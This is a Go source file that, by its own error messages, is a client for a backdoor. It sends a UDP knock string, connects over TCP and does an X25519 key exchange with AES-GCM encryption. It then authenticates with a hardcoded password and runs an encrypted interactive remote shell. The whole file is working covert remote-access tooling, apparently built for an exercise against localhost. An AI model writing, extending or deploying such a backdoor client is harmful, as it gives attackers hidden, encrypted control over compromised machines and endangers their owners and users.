package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/hkdf"
)

var pwd bool = false

func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, msg, info)
	return ct
}

func open(buf []byte, info []byte, gcm cipher.AEAD) ([]byte, error) {
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, info)
}

func sendThread(conn net.Conn, gcm cipher.AEAD, info []byte) {
	reader := bufio.NewReader(os.Stdin)
	for {
		in, _ := reader.ReadString('\n')
		ct := seal([]byte(in), info, gcm)
		conn.Write(ct)
	}
}

func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup) {
	buf := make([]byte, 1052)
	pwd = true
	for {
		if pwd {
			ct := seal([]byte("pwd\n"), info, gcm)
			conn.Write(ct)
			r, err := conn.Read(buf)
			if err != nil {
				break
			}
			tempBuf := buf[:r]
			pt, err := open(tempBuf, info, gcm)
			if err != nil {
				fmt.Println("err in pwd")
				break
			}
			fmt.Print(string(pt[:len(pt)-1]) + "> ")
		}

		r, err := conn.Read(buf)
		if err != nil {
			break
		}
		if r == 1052 {
			pwd = false
		} else {
			pwd = true
		}
		tempBuf := buf[:r]
		pt, err := open(tempBuf, info, gcm)
		if err != nil {
			fmt.Println("err")
			break
		}
		fmt.Print(string(pt))
	}
	wg.Done()
}

func main() {
	// Begin connection
	udp, uerr := net.Dial("udp", "localhost:6666")
	if uerr != nil {
		fmt.Println("Error dialing the backdoor, exiting...")
		return
	}
	udp.Write([]byte("!@fizzbuzz@!"))
	udp.Close()
	var conn net.Conn
	var err error
	// Retry every 250ms depending on system
	for i := 0; i < 6; i++ {
		conn, err = net.Dial("tcp", "localhost:3333")
		if err != nil {
			time.Sleep(250 * time.Millisecond)
		} else {
			break
		}
	}
	if err != nil {
		fmt.Println("Error dialing the backdoor, exiting...")
		return
	}
	defer conn.Close()

	// Generate private and public keys
	priv, _ := ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	pub := priv.PublicKey()

	// Send the server our public key
	conn.Write(pub.Bytes())

	// Read in the server's public key and derive the shared secret
	buf := make([]byte, 1024)
	readLen, _ := conn.Read(buf)
	remote, _ := ecdh.X25519().NewPublicKey(buf[:readLen])
	shared, _ := priv.ECDH(remote)

	// Derive the AES key and HMAC key
	kdf := hkdf.New(sha256.New, shared, nil, nil)
	var gcmKey [32]byte
	var hmacKey [32]byte
	kdf.Read(gcmKey[:])
	kdf.Read(hmacKey[:])

	// Make the AES cipher
	c, _ := aes.NewCipher(gcmKey[:])
	gcm, _ := cipher.NewGCM(c)

	// Make an associated data with all of our sent packets
	info := []byte(conn.RemoteAddr().String() + conn.LocalAddr().String())
	hm := hmac.New(sha256.New, hmacKey[:])
	hm.Write(info)
	info = hm.Sum(nil)

	// Send the password, TODO. make it parameterizable
	pt := []byte("foobar")
	ct := seal(pt, info, gcm)
	conn.Write(ct)

	// Read the ack from server
	readLen, _ = conn.Read(buf)
	tempBuf := buf[:readLen]
	ack, err := open(tempBuf, info, gcm)
	if err != nil {
		fmt.Println("Failed to decrypt")
	}
	if string(ack) != "ack" {
		return
	}

	// Start threads for handling connection
	var wg sync.WaitGroup
	wg.Add(1)
	go sendThread(conn, gcm, info[:])
	go recvThread(conn, gcm, info[:], &wg)
	wg.Wait()
}
